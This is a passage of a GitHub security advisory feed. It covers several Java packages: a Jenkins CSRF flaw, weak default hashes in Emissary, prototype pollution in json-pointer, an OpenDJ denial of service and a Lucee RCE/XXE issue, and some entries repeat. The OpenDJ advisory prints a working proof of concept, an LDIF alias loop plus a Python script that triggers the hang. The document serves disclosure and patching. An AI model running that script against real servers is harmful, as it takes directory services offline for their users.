<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27625">https://nvd.nist.gov/vuln/detail/CVE-2025-27625</a></li>
<li><a href="https://www.jenkins.io/security/advisory/2025-03-05/#SECURITY-3501">https://www.jenkins.io/security/advisory/2025-03-05/#SECURITY-3501</a></li>
<li><a href="https://github.com/jenkinsci/jenkins/commit/4a9a3ecd08fc00d2f1c1125be789d8be24f02c9e">https://github.com/jenkinsci/jenkins/commit/4a9a3ecd08fc00d2f1c1125be789d8be24f02c9e</a></li>
<li><a href="https://github.com/advisories/GHSA-8hmv-92wm-39ch">https://github.com/advisories/GHSA-8hmv-92wm-39ch</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8hmv-92wm-39ch</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-06T00:31:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.jenkins-ci.main:jenkins-core] Jenkins cross-site request forgery (CSRF) vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-7g95-jmg9-h524</id>
        <link href="https://github.com/advisories/GHSA-7g95-jmg9-h524"/>
        <updated>2025-03-06T19:24:41.000Z</updated>
        <content type="html"><![CDATA[<p>Jenkins 2.499 and earlier, LTS 2.492.1 and earlier does not require POST requests for the HTTP endpoint toggling collapsed/expanded status of sidepanel widgets (e.g., Build Queue and Build Executor Status widgets), resulting in a cross-site request forgery (CSRF) vulnerability.</p>
<p>This vulnerability allows attackers to have users toggle their collapsed/expanded status of sidepanel widgets.</p>
<p>Additionally, as the API accepts any string as the identifier of the panel ID to be toggled, attacker-controlled content can be stored in the victim’s user profile in Jenkins.</p>
<p>Jenkins 2.500, LTS 2.492.2 requires POST requests for the affected HTTP endpoint.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27624">https://nvd.nist.gov/vuln/detail/CVE-2025-27624</a></li>
<li><a href="https://www.jenkins.io/security/advisory/2025-03-05/#SECURITY-3498">https://www.jenkins.io/security/advisory/2025-03-05/#SECURITY-3498</a></li>
<li><a href="https://github.com/jenkinsci/jenkins/commit/84ef1a4d4db17d0ce66522d0141f6e52e2a4c97c">https://github.com/jenkinsci/jenkins/commit/84ef1a4d4db17d0ce66522d0141f6e52e2a4c97c</a></li>
<li><a href="https://github.com/advisories/GHSA-7g95-jmg9-h524">https://github.com/advisories/GHSA-7g95-jmg9-h524</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7g95-jmg9-h524</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-06T00:31:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.jenkins-ci.main:jenkins-core] Jenkins cross-site request forgery (CSRF) vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-7g95-jmg9-h524</id>
        <link href="https://github.com/advisories/GHSA-7g95-jmg9-h524"/>
        <updated>2025-03-06T19:24:41.000Z</updated>
        <content type="html"><![CDATA[<p>Jenkins 2.499 and earlier, LTS 2.492.1 and earlier does not require POST requests for the HTTP endpoint toggling collapsed/expanded status of sidepanel widgets (e.g., Build Queue and Build Executor Status widgets), resulting in a cross-site request forgery (CSRF) vulnerability.</p>
<p>This vulnerability allows attackers to have users toggle their collapsed/expanded status of sidepanel widgets.</p>
<p>Additionally, as the API accepts any string as the identifier of the panel ID to be toggled, attacker-controlled content can be stored in the victim’s user profile in Jenkins.</p>
<p>Jenkins 2.500, LTS 2.492.2 requires POST requests for the affected HTTP endpoint.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27624">https://nvd.nist.gov/vuln/detail/CVE-2025-27624</a></li>
<li><a href="https://www.jenkins.io/security/advisory/2025-03-05/#SECURITY-3498">https://www.jenkins.io/security/advisory/2025-03-05/#SECURITY-3498</a></li>
<li><a href="https://github.com/jenkinsci/jenkins/commit/84ef1a4d4db17d0ce66522d0141f6e52e2a4c97c">https://github.com/jenkinsci/jenkins/commit/84ef1a4d4db17d0ce66522d0141f6e52e2a4c97c</a></li>
<li><a href="https://github.com/advisories/GHSA-7g95-jmg9-h524">https://github.com/advisories/GHSA-7g95-jmg9-h524</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7g95-jmg9-h524</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-06T00:31:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gov.nsa.emissary:emissary] Emissary May Use a Broken or Risky Cryptographic Algorithm]]></title>
        <id>https://github.com/advisories/GHSA-hw43-fcmm-3m5g</id>
        <link href="https://github.com/advisories/GHSA-hw43-fcmm-3m5g"/>
        <updated>2025-03-06T01:33:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The ChecksumCalculator class within  allows for hashing and checksum generation, but it includes or defaults to algorithms that are no longer recommended for secure cryptographic use cases (e.g., SHA-1, CRC32, and SSDEEP). These algorithms, while possibly valid for certain non-security-critical tasks, can expose users to security risks if used in scenarios where strong cryptographic guarantees are required.</p>
<h3 id="requirement-from-nist">Requirement from NIST</h3>
<p>Requirement from NIST regarding SHA1</p>
<p><a href="https://csrc.nist.gov/projects/hash-functions#:~:text=NIST%20deprecated%20the%20use%20of,use%20of%20the%20SHA%2D1">https://csrc.nist.gov/projects/hash-functions#:~:text=NIST%20deprecated%20the%20use%20of,use%20of%20the%20SHA%2D1</a>.</p>
<blockquote>
<p>Federal agencies should use SHA-2 or SHA-3 as an alternative to SHA-1.
Further guidance will be available soon. Send questions on the transition to <a href="mailto:sha-1-transition@nist.gov">sha-1-transition@nist.gov</a>.</p>
</blockquote>
<p><a href="https://www.nist.gov/news-events/news/2022/12/nist-retires-sha-1-cryptographic-algorithm">https://www.nist.gov/news-events/news/2022/12/nist-retires-sha-1-cryptographic-algorithm</a></p>
<h3 id="mitigation-and-fix">Mitigation and Fix</h3>
<p>Make it clear to developers and users that the ChecksumCalculator is specific to the "Known File Filter" (KFF) document similarity feature and is not intended to suggest or endorse global use as a cryptographically secure hashing or checksum mechanism.</p>
<p>While these specific default insecure algorithms can not be updated without violating the intended use-case, it can be clearly documented and prevented using better access modifiers in the ChecksumCalculator class.</p>
<h3 id="details">Details</h3>
<p>Within ChecksumCalculator.java, the following points raise potential security concerns:</p>
<p>SHA-1:
SHA-1 has been widely deprecated for cryptographic purposes due to known collision attacks.
The constructor defaults to "SHA-1" if no specific algorithm is provided.
CRC32:
CRC32 is a simple checksum mechanism, not a cryptographic hash function. It is unsuitable for security-critical integrity checks since it can be easily manipulated or collided.
SSDEEP (Fuzzy Hashing):
SSDEEP is a context-specific tool used for similarity matching and may not be a secure cryptographic function for authentication or tamper detection.
There is no apparent mechanism to prevent developers from using these weaker algorithms in security-sensitive contexts. Users of emissary who rely on ChecksumCalculator for strong security guarantees (e.g., data integrity or authentication) may be misled into assuming these algorithms provide adequate protection.</p>
<h3 id="poc">PoC</h3>
<p>Code could be found <a href="https://github.com/NationalSecurityAgency/emissary/blob/main/src/main/java/emissary/kff/ChecksumCalculator.java">https://github.com/NationalSecurityAgency/emissary/blob/main/src/main/java/emissary/kff/ChecksumCalculator.java</a></p>
<h3 id="impact">Impact</h3>
<p>Impact
Weakened Security Posture: Applications integrating Emissary may inadvertently use these algorithms in a way that could be exploited (e.g., collisions in SHA-1, trivial collisions in CRC32).
Misleading Assurance: Developers might assume Emissary’s recommended defaults are secure for cryptographic validation, which can result in insecure implementations.
Potential for Collision Attacks: Attackers could craft inputs that yield the same SHA-1 hash or manipulate CRC32 sums, thus bypassing naive integrity checks.
Because this project is produced under the NSA umbrella, users may have an inflated trust in its security posture, potentially leading them to rely on these algorithms in high-security environments without recognizing the associated risks.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/NationalSecurityAgency/emissary/security/advisories/GHSA-hw43-fcmm-3m5g">https://github.com/NationalSecurityAgency/emissary/security/advisories/GHSA-hw43-fcmm-3m5g</a></li>
<li><a href="https://github.com/NationalSecurityAgency/emissary/commit/da3a81a8977577597ff2a944820a5ae4e9762368">https://github.com/NationalSecurityAgency/emissary/commit/da3a81a8977577597ff2a944820a5ae4e9762368</a></li>
<li><a href="https://github.com/NationalSecurityAgency/emissary/releases/tag/8.24.0">https://github.com/NationalSecurityAgency/emissary/releases/tag/8.24.0</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27508">https://nvd.nist.gov/vuln/detail/CVE-2025-27508</a></li>
<li><a href="https://github.com/advisories/GHSA-hw43-fcmm-3m5g">https://github.com/advisories/GHSA-hw43-fcmm-3m5g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hw43-fcmm-3m5g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-05T22:18:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.webjars.npm:json-pointer] Prototype pollution in json-pointer]]></title>
        <id>https://github.com/advisories/GHSA-7mg4-w3w5-x5pc</id>
        <link href="https://github.com/advisories/GHSA-7mg4-w3w5-x5pc"/>
        <updated>2025-03-05T19:04:38.000Z</updated>
        <content type="html"><![CDATA[<p>This affects the package json-pointer before 0.6.1. Multiple reference of object using slash is supported.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-7709">https://nvd.nist.gov/vuln/detail/CVE-2020-7709</a></li>
<li><a href="https://github.com/manuelstofer/json-pointer/pull/34">https://github.com/manuelstofer/json-pointer/pull/34</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JS-JSONPOINTER-596925">https://snyk.io/vuln/SNYK-JS-JSONPOINTER-596925</a></li>
<li><a href="https://www.npmjs.com/package/json-pointer">https://www.npmjs.com/package/json-pointer</a></li>
<li><a href="https://github.com/manuelstofer/json-pointer/pull/34/files">https://github.com/manuelstofer/json-pointer/pull/34/files</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-598862">https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-598862</a></li>
<li><a href="https://github.com/advisories/GHSA-7mg4-w3w5-x5pc">https://github.com/advisories/GHSA-7mg4-w3w5-x5pc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7mg4-w3w5-x5pc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-05-10T18:37:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.openidentityplatform.opendj:opendj-server-legacy] OpenDJ Denial of Service (DoS) using alias loop]]></title>
        <id>https://github.com/advisories/GHSA-93qr-h8pr-4593</id>
        <link href="https://github.com/advisories/GHSA-93qr-h8pr-4593"/>
        <updated>2025-03-05T18:33:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A denial-of-service (DoS) vulnerability in OpenDJ has been discovered that causes the server to become unresponsive to all LDAP requests without crashing or restarting. This issue occurs when an alias loop exists in the LDAP database. If an <code>ldapsearch</code> request is executed with alias dereferencing set to "always" on this alias entry, the server stops responding to all future requests.
I have confirmed this issue using the latest OpenDJ version (9.2), both with the official OpenDJ Docker image and a local OpenDJ server running on my Windows 10 machine.</p>
<h3 id="details">Details</h3>
<p>An unauthenticated attacker can exploit this vulnerability using a single crafted <code>ldapsearch</code> request. Fortunately, the server can be restarted without data corruption. While this attack requires the existence of an alias loop, I am uncertain whether such loops can be easily created in specific environments or if the method can be adapted to execute other DoS attacks more easily.</p>
<h3 id="poc-steps-to-reproduce">PoC (Steps to Reproduce)</h3>
<ol>
<li>Set up an OpenDJ server instance as usual, using the base DN <code>dc=example,dc=com</code></li>
<li>Import the attached <code>example_data_alias_dos.ldif</code> file into the LDAP database</li>
<li>Ensure that the <code>ldap3</code> Python library is installed (<code>pip install ldap3</code>)</li>
<li>Run the attached Python script <code>python opendj_alias_dos.py</code>, which searches for alias loops and executes the DoS attack</li>
<li>After executing the script, the server will stop responding to requests until it is restarted</li>
</ol>
<h3 id="impact">Impact</h3>
<p>This vulnerability directly affects server availability for everyone using it. A single <code>ldapsearch</code> request on an alias loop entry can cause the entire server to become unresponsive, requiring a restart. The issue can be repeatedly triggered. The following response message is displayed on following requests:</p>
<pre><code>result: 80 Other (e.g., implementation specific) error
text: com.sleepycat.je.EnvironmentFailureException: (JE 18.3.12) JAVA_ERROR: Java Error occurred, recovery may not be possible.
</code></pre>
<p><strong>example_data_alias_dos.ldif</strong></p>
<pre><code>dn: dc=example,dc=com
objectClass: top
objectClass: domain
dc: example

dn: ou=people,dc=example,dc=com
objectClass: top
objectClass: organizationalUnit
ou: people
description: All users

dn: ou=students,ou=people,dc=example,dc=com
objectClass: top
objectClass: organizationalUnit
ou: students
description: All students

dn: uid=jd123,ou=students,ou=people,dc=example,dc=com
objectClass: top
objectClass: inetOrgPerson
objectClass: organizationalPerson
objectClass: person
mail: jd123@example.com
sn: Doe
cn: John Doe
givenName: John
uid: jd123

dn: ou=employees,ou=people,dc=example,dc=com
objectClass: top
objectClass: organizationalUnit
ou: employees
description: All employees

dn: uid=jd123,ou=employees,ou=people,dc=example,dc=com
objectClass: alias
objectClass: top
objectClass: extensibleObject
aliasedObjectName: uid=jd123,ou=researchers,ou=people,dc=example,dc=com
uid: jd123

dn: ou=researchers,ou=people,dc=example,dc=com
objectClass: top
objectClass: organizationalUnit
ou: researchers
description: All reasearchers

dn: uid=jd123,ou=researchers,ou=people,dc=example,dc=com
objectClass: alias
objectClass: top
objectClass: extensibleObject
aliasedObjectName: uid=jd123,ou=employees,ou=people,dc=example,dc=com
uid: jd123
</code></pre>
<p><strong>opendj_alias_dos.py</strong></p>
<pre><code class="language-Python">import argparse

from ldap3 import Server, Connection, ALL, DEREF_NEVER, DEREF_ALWAYS
from ldap3.core.exceptions import LDAPBindError, LDAPSocketOpenError


def connect_to_ldap(ip, port):
    try:
        server = Server(ip, port, get_info=ALL)
        connection = Connection(server, auto_bind=True)
        return connection
    except (LDAPBindError, LDAPSocketOpenError) as e:
        print(f"Error connecting to LDAP server: {e}")
        return None


def find_aliases(connection, base_dn):
    try:
        search_filter = "(objectClass=alias)"
        connection.search(base_dn, search_filter=search_filter, dereference_aliases=DEREF_NEVER, attributes=["*"])
    except Exception as e:
        print(f"Error during search: {e}")

    aliases = {}
    for entry in connection.entries:
        entry_dn = entry.entry_dn
        entry_alias = entry.aliasedObjectName.value
        aliases[entry_dn] = entry_alias

    return aliases


def detect_alias_loop(aliases):
    visited = set()
    path = set()

    def dfs(alias):
        if alias in path:
            return alias
        if alias in visited:
            return None

        path.add(alias)
        visited.add(alias)

        aliased_target = aliases.get(alias)
        if aliased_target:
            result = dfs(aliased_target)
            if result:
                return result

        path.remove(alias)
        return None

    for alias in aliases:
        if alias not in visited:
            loop_alias = dfs(alias)
            if loop_alias:
                return loop_alias

    return None


def execute_dos_search(connection, looping_alias_dn):
    try:
        search_filter = "(objectClass=*)"
        connection.search(looping_alias_dn, search_filter=search_filter, dereference_aliases=DEREF_ALWAYS)
    except Exception as e:
        print(f"Error during search: {e}")

    for entry in connection.entries:
        entry_dn = entry.entry_dn
        print(entry_dn)


def main():
    parser = argparse.ArgumentParser(description="Search LDAP for circular alias references.")
    parser.add_argument("ip", type=str, nargs="?", default=None, help="The IP address of the LDAP server.")
    parser.add_argument("port", type=int, nargs="?", default=None, help="The port of the LDAP server.")
    parser.add_argument("base", type=str, nargs="?", default=None, help="The base DN of the LDAP server.")
    args = parser.parse_args()

    if not args.ip:
        args.ip = input("Please enter the IP address of the LDAP server: ")

    if not args.port:
        while True:
            try:
                port_input = input("Please enter the port of the LDAP server: ")
                args.port = int(port_input)
                break
            except ValueError:
                print("Invalid input. Please enter a valid integer for the port.")

    if not args.base:
        args.base = input("Please enter the base DN of the LDAP server: ")

    connection = connect_to_ldap(args.ip, args.port)
    if connection:
        aliases = find_aliases(connection, args.base)
        looping_alias_dn = detect_alias_loop(aliases)
        if looping_alias_dn:
            execute_dos_search(connection, looping_alias_dn)
            print(f"DOS executed with alias: {looping_alias_dn}")
        else:
            print("No looping alias DN found!")
        connection.unbind()


if __name__ == "__main__":
    main()
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OpenIdentityPlatform/OpenDJ/security/advisories/GHSA-93qr-h8pr-4593">https://github.com/OpenIdentityPlatform/OpenDJ/security/advisories/GHSA-93qr-h8pr-4593</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27497">https://nvd.nist.gov/vuln/detail/CVE-2025-27497</a></li>
<li><a href="https://github.com/OpenIdentityPlatform/OpenDJ/commit/08aee4724608e4a32baa3c7d7499ec913a275aaf">https://github.com/OpenIdentityPlatform/OpenDJ/commit/08aee4724608e4a32baa3c7d7499ec913a275aaf</a></li>
<li><a href="https://github.com/advisories/GHSA-93qr-h8pr-4593">https://github.com/advisories/GHSA-93qr-h8pr-4593</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-93qr-h8pr-4593</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-05T18:33:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.lucee:lucee] Lucee RCE/XXE Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-vwjx-mmwm-pwrf</id>
        <link href="https://github.com/advisories/GHSA-vwjx-mmwm-pwrf"/>
        <updated>2025-03-05T19:30:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The Lucee team received a responsible disclosure of a security vulnerability which affects all previous releases of Lucee.</p>
<p>After reviewing the report and confirming the vulnerability, the Lucee team then conducted a further security review and found additional vulnerabilities which have been addressed as part of this this security update.</p>
<h3 id="patches">Patches</h3>
<p>Lucee 5.4.3.2 and 5.3.12.1 stable releases have been patched with additional hardening</p>
<p>The older releases, 5.3.7.59., 5.3.8.236 and 5.3.9.173 have also been patched</p>
<p>Any users running older release, should plan to immediately upgrade to the latest stable release</p>
<p>6.0 will have a RC as it's not yet released</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lucee/Lucee/security/advisories/GHSA-vwjx-mmwm-pwrf">https://github.com/lucee/Lucee/security/advisories/GHSA-vwjx-mmwm-pwrf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-38693">https://nvd.nist.gov/vuln/detail/CVE-2023-38693</a></li>
<li><a href="https://github.com/advisories/GHSA-vwjx-mmwm-pwrf">https://github.com/advisories/GHSA-vwjx-mmwm-pwrf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vwjx-mmwm-pwrf</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-03-05T18:31:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.lucee:lucee] Lucee RCE/XXE Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-vwjx-mmwm-pwrf</id>
        <link href="https://github.com/advisories/GHSA-vwjx-mmwm-pwrf"/>
        <updated>2025-03-05T19:30:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The Lucee team received a responsible disclosure of a security vulnerability which affects all previous releases of Lucee.</p>
<p>After reviewing the report and confirming the vulnerability, the Lucee team then conducted a further security review and found additional vulnerabilities which have been addressed as part of this this security update.</p>
<h3 id="patches">Patches</h3>
<p>Lucee 5.4.3.2 and 5.3.12.1 stable releases have been patched with additional hardening</p>
<p>The older releases, 5.3.7.59., 5.3.8.236 and 5.3.9.173 have also been patched</p>
<p>Any users running older release, should plan to immediately upgrade to the latest stable release</p>
<p>6.0 will have a RC as it's not yet released</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lucee/Lucee/security/advisories/GHSA-vwjx-mmwm-pwrf">https://github.com/lucee/Lucee/security/advisories/GHSA-vwjx-mmwm-pwrf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-38693">https://nvd.nist.gov/vuln/detail/CVE-2023-38693</a></li>
<li><a href="https://github.com/advisories/GHSA-vwjx-mmwm-pwrf">https://github.com/advisories/GHSA-vwjx-mmwm-pwrf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vwjx-mmwm-pwrf</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-03-05T18:31:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.lucee:lucee] Lucee RCE/XXE Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-vwjx-mmwm-pwrf</id>
        <link href="https://github.com/advisories/GHSA-vwjx-mmwm-pwrf"/>
        <updated>2025-03-05T19:30:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The Lucee team received a responsible disclosure of a security vulnerability which affects all previous releases of Lucee.</p>
<p>After reviewing the report and confirming the vulnerability, the Lucee team then conducted a further security review and found additional vulnerabilities which have been addressed as part of this this security update.</p>
<h3 id="patches">Patches</h3>
<p>Lucee 5.4.3.2 and 5.3.12.1 stable releases have been patched with additional hardening</p>
<p>The older releases, 5.3.7.59., 5.3.8.236 and 5.3.9.173 have also been patched</p>
<p>Any users running older release, should plan to immediately upgrade to the latest stable release</p>
<p>6.0 will have a RC as it's not yet released</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lucee/Lucee/security/advisories/GHSA-vwjx-mmwm-pwrf">https://github.com/lucee/Lucee/security/advisories/GHSA-vwjx-mmwm-pwrf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-38693">https://nvd.nist.gov/vuln/detail/CVE-2023-38693</a></li>
<li><a href="https://github.com/advisories/GHSA-vwjx-mmwm-pwrf">https://github.com/advisories/GHSA-vwjx-mmwm-pwrf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vwjx-mmwm-pwrf</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-03-05T18:31:03.000Z</published>
    </entry>
</feed>